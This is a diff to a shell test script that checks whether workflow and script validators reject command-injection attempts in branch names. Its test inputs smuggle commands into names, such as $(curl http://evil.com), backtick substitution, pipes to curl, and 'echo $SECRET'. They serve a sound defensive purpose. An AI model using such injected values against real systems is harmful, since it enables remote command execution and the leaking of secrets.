@@ -35,7 +35,7 @@ test_workflow_validation() {
         result="accepted"
     fi
     
-    if [ "$result" = "$expected" ] || ([ "$expected" = "rejected" ] && [[ "$result" =~ ^rejected ]]); then
+    if [ "$result" = "$expected" ] || { [ "$expected" = "rejected" ] && [[ "$result" =~ ^rejected ]]; }; then
         echo -e "${GREEN}✓ PASS${NC}: $description"
         echo "   Input: '$branch' -> $result"
         ((PASSED_TESTS++))
@@ -66,7 +66,7 @@ test_script_validation() {
         result="accepted"
     fi
     
-    if [ "$result" = "$expected" ] || ([ "$expected" = "rejected" ] && [[ "$result" =~ ^rejected ]]); then
+    if [ "$result" = "$expected" ] || { [ "$expected" = "rejected" ] && [[ "$result" =~ ^rejected ]]; }; then
         echo -e "${GREEN}✓ PASS${NC}: $description"
         echo "   Input: '$branch' -> $result"
         ((PASSED_TESTS++))
@@ -83,9 +83,12 @@ echo "=== Testing Command Injection Attempts ==="
 echo ""
 
 # Critical attack vectors
+# shellcheck disable=SC2016  # Single quotes intentional - testing literal attack patterns
 test_workflow_validation 'main$(curl http://evil.com)' "rejected" "Command substitution with \$()"
+# shellcheck disable=SC2016  # Single quotes intentional - testing literal attack patterns
 test_workflow_validation 'main`curl http://evil.com`' "rejected" "Command substitution with backticks"
 test_workflow_validation 'main; curl http://evil.com' "rejected" "Semicolon command separator"
+# shellcheck disable=SC2016  # Single quotes intentional - testing literal attack patterns
 test_workflow_validation 'main && echo $SECRET' "rejected" "AND command separator"
 test_workflow_validation 'main|curl evil.com' "rejected" "Pipe command separator"
 test_workflow_validation 'main&background' "rejected" "Background execution"
@@ -95,9 +98,12 @@ test_workflow_validation 'main(test)' "rejected" "Parentheses subshell"
 test_workflow_validation 'main{test}' "rejected" "Braces expansion"
 
 echo ""
+# shellcheck disable=SC2016  # Single quotes intentional - testing literal attack patterns
 test_script_validation 'main$(curl http://evil.com)' "rejected" "Shell script: Command substitution with \$()"
+# shellcheck disable=SC2016  # Single quotes intentional - testing literal attack patterns
 test_script_validation 'main`curl http://evil.com`' "rejected" "Shell script: Command substitution with backticks"
 test_script_validation 'main; curl http://evil.com' "rejected" "Shell script: Semicolon command separator"
+# shellcheck disable=SC2016  # Single quotes intentional - testing literal attack patterns
 test_script_validation 'main && echo $SECRET' "rejected" "Shell script: AND command separator"
 test_script_validation 'main|curl evil.com' "rejected" "Shell script: Pipe command separator"
 
